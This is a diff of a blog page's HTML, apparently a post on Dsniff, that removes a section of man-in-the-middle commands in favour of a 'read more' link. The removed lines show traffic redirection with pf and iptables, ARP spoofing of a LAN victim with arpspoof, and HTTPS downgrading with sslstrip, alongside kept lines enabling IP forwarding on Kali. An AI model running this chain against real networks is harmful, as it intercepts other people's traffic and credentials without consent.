@@ -184,27 +184,8 @@ sudo sysctl -w net.inet.ip.fw.verbose=1
 <pre><code>sysctl -p
 </code></pre><p>on kali</p>
 <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
-</code></pre><h2 id="port-redirect"><a href="#port-redirect" class="headerlink" title="port redirect"></a>port redirect</h2><p>on mac <a href="https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man5/pf.conf.5.html" target="_blank" rel="external">pf</a> </p>
-<pre><code>vim /etc/pf.conf
-</code></pre><p>set configuration</p>
-<pre><code>rdr pass on inet en0 proto { tcp, udp } from any to any port 80 -&gt; 127.0.0.1 port 8000
-</code></pre><p>enable it </p>
-<pre><code>pfctl -v -n -f /etc/pf.conf
-pfctl -f /etc/pf.conf
-</code></pre><p>on ubuntu <a href="https://help.ubuntu.com/community/IptablesHowTo" target="_blank" rel="external">iptables</a></p>
-<p>enable iptables</p>
-<pre><code>modprobe ip_tables
-</code></pre><p>port redirect</p>
-<pre><code>iptables -t nat -A PREROUTING -d *.*.*.* -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000
-</code></pre><p>check</p>
-<pre><code>iptables -t nat --list
-</code></pre><p>delete</p>
-<pre><code>iptables -t nat -D PREROUTING 1
-</code></pre><h2 id="arp-spoof"><a href="#arp-spoof" class="headerlink" title="arp spoof"></a>arp spoof</h2><p>spoof machine with ip 192.168.0.49 on mac address of 192.168.0.1 by mac address of en0</p>
-<pre><code>sudo arpspoof -i en0 -t 192.168.0.49 192.168.0.1
-</code></pre><h2 id="ssl-strip"><a href="#ssl-strip" class="headerlink" title="ssl strip"></a>ssl strip</h2><pre><code>sslstrip -a -l 8000 -w sslstrip.log
-tail -f sslstrip.log
 </code></pre>
+        <a class="article-more-a"  href="2017/04/12/Dsniff/#more">more >></a>
       
 
       
